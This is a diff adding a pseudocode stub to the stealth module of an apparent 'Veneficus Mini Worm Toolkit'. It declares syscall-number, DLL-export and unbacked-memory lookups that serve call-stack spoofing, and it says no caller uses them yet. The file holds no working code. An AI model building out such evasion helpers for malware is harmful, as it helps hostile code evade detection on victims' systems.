@@ -1,0 +1,17 @@
+# +--------------------------------------------------------------------------+
+# |                                                                          |
+# |                       Veneficus Mini Worm Toolkit                        |
+# |                                                                          |
+# +--------------------------------------------------------------------------+
+
+# src/stealth/stack_cover.pseudo
+# Thin wrappers around a public stack-cover helper.
+
+FUNCTION bring_up():
+    log only; no frames are actually synthesized at this call
+
+FUNCTION syscall_number(name) -> optional u16
+FUNCTION export_addr(dll, function) -> optional pointer
+FUNCTION unbacked_ranges(dll) -> list of (start, end)
+
+# No call site in entry or payload uses these to spoof a stack.
